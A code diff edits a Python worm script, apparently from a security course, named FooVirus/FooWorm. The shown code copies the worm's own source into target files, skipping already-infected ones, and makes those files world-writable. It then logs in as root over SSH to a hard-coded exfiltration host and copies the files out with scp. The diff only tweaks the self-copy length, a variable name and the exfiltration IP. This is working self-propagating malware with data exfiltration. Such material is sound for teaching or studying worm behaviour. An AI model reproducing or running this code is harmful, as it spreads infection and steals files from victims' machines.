@@ -150,13 +150,12 @@ while True:
                     print("\nWill now try to infect the files first with FooVirus")
                     # FooVirus.py starts here
                     IN = open(sys.argv[0], 'r')
-                    length = len(IN.readlines())
-                    fooworm = [line for (i,line) in enumerate(IN) if i < length]
+                    fooworm = [line for (i,line) in enumerate(IN) if i < 185]
 
                     for filename in files_of_interest_at_target:
-                        IN = open(filename, 'r')
-                        all_of_it = IN.readlines()
-                        IN.close()
+                        file_of_interest = open(filename, 'r')
+                        all_of_it = file_of_interest.readlines()
+                        file_of_interest.close()
                         if any('FooWorm' in line for line in all_of_it): continue       # if the file is already infected, skip it
                         os.chmod(filename, 0o777)
                         OUT = open(filename, 'w')
@@ -170,7 +169,7 @@ while True:
                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                         #  For exfiltration demo to work, you must provide an IP address and the login 
                         #  credentials in the next statement:
-                        ssh.connect('172.17.0.10',port=22,username='root',password='mypassword',timeout=5)
+                        ssh.connect('172.17.0.11',port=22,username='root',password='mypassword',timeout=5)
                         scpcon = scp.SCPClient(ssh.get_transport())
                         print("\n\nconnected to exfiltration host\n")
                         for filename in files_of_interest_at_target:
